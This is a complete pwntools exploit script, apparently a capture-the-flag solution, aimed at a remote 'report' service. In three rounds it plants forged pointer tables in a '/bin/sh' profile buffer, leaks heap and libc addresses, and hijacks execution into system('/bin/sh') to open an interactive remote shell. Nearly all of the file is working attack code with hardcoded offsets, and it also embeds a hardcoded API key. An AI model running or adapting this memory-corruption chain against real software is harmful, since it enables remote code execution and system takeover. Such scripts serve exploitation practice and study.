from pwn import *
import json

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# p = process('./report')
p = remote("report.eatpwnnosleep.com", 55555)

api_key = "ac261681692e300a406552de038cc01df05ef108e21857beac6c1c3dce6498d4"

a = {
    'apikey' : api_key,
}

p.send(json.dumps(a).encode())

DEBUG = True

script = "b *0x401156\n"
script += "b *0x400f06\n"

# gdb.attach(p, gdbscript=script)

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info("Received:" + response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def add(subject_type, name, credit, grade):
  r("==>")
  s("1")

  r("==>")
  s(str(subject_type))

  r("==>")
  s(name)

  r("==>")
  s(str(credit))

  r("==>")
  s(str(grade))

def delete(name):
  r("==>")
  s("2")

  r("==>")
  s(name)

def do_print():
  r("==>")
  s("3")

stdin_offset = 0x3c48e0
system_offset = 0x45390
gadget = 0x400f06 # add rsp, 0xd8 ; pop rbx ; pop rbp ; ret
main = 0x400c79
puts_ptr = 0x602f90

setSubName = 0x402118
setTeacherName = 0x4020e8
calcTotalCredit = 0x4020f8
clearMemory = 0x402120
stdin = 0x603070
offset_buf = 0x603a80
freehook_offset = 0x3c67a8
fhptr_offset = 0x3c3ef8
puts_offset = 0x6f690

r("==>")
s("asdfasdf")

profile = '/bin/sh'

profile = profile.ljust(0x80, '\x00')
profile += p64(setTeacherName - 8)
profile += p64(setSubName - 8)

profile = profile.ljust(0x100, '\x00')
profile += p64(setSubName - 8)
profile += p64(offset_buf) # stdin

profile = profile.ljust(0x180, '\x00')
profile += p64(main)
profile += p64(puts_ptr)

profile = profile.ljust(0x200, '\x00')
profile += p64(clearMemory - 8)
profile += p64(0xdeadbeef)

profile = profile.ljust(0x800, '\x00')
profile += p64(calcTotalCredit - 0x8)
profile += 'A' * 16
profile += p64(stdin - 0x18)
profile += p64(offset_buf - 0x18)
profile += p64(0) * 14
profile += p64(0)

profile = profile.ljust(0x900, '\x00')
profile += p64(calcTotalCredit - 0x8)
profile += 'A' * 16
profile += p64(offset_buf - 0x18 + 8)
profile += p64(0) * 15
profile += p64(0)

r("==>")
s(profile, False)

add(1, 'ebmoon', 3, 3)

do_print()

r("asdfasdf")
leak_str = r("====")[:4]
if leak_str[-1] == '\x20':
  leak_str = leak_str[:-1]

leak = u64(leak_str.ljust(8, "\x00"))
buf = leak - 0x1010

print "heap leak: 0x%x" % leak
print "buf: 0x%x" % buf

r("==>")
s("4")

payload = p64((1 << 64) + fhptr_offset - stdin_offset)
payload += p64(buf + 0x180)

payload += p64(buf + 0x100)
payload += p64(buf + 0x800)
payload += p64(buf + 0x80)

payload += p64(buf + 0x900)
payload += p64(buf + 0x88)

# payload += p64(buf + 0x200)

payload = payload.ljust(0x68, "\x00")

r("==>")
s(payload, False)






# Second loop

buf2 = buf + 0x1060

r("==>")
s("asdfasdf\n", False)

profile = '/bin/sh'

profile = profile.ljust(0x80, "\x00")
profile += p64(clearMemory - 8)
profile += p64(puts_ptr)

profile = profile.ljust(0x100, '\x00')
profile += p64(calcTotalCredit - 0x8)
profile += 'A' * 16
profile += p64(buf + 0x180 - 0x18 + 8)
profile += p64(0) * 15
profile += p64(0)

r("==>")
s(profile, False)

r("==>")
s("4")

payload = p64((1 << 64) + fhptr_offset - stdin_offset)
payload += p64(buf + 0x180)

payload += p64(buf2 + 0x100)
payload += p64(buf + 0x88)
payload += p64(buf2 + 0x80)

payload += p64(buf + 0x900)
payload += p64(buf + 0x88)
# payload += p64(buf + 0x200)

payload = payload.ljust(0x68, "\x00")

r("==>")
s(payload, False)

libc_leak_str = r("\n")[1:-1]
puts_addr = u64(libc_leak_str.ljust(8, "\x00"))

libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset

print "puts_addr: 0x%x" % puts_addr
print "puts_addr: 0x%x" % system_addr

### Third loop

r("==>")
s("asdfasdf\n", False)

buf3 = buf2 + 0x1010

profile = '/bin/sh'

profile = profile.ljust(0x80, "\x00")
profile += p64(system_addr)
profile += p64(buf3 + 0x80)

profile = profile.ljust(0x100, '\x00')
profile += p64(calcTotalCredit - 0x8)
profile += 'A' * 16
profile += p64(buf3 + 0x80 - 0x18 + 8)
profile += p64(0) * 15
profile += p64(0)

profile = profile.ljust(0x200, "\x00")
profile += p64(clearMemory - 8)
profile += p64(buf3)

r("==>")
s(profile, False)

r("==>")
s("4")

payload = p64((1 << 64) + fhptr_offset - stdin_offset)
payload += p64(buf + 0x180)

payload += p64(buf3 + 0x100)
payload += p64(buf + 0x88)
payload += p64(buf3 + 0x200)

payload = payload.ljust(0x68, "\x00")

r("==>")
s(payload, False)

p.interactive()
p.close()
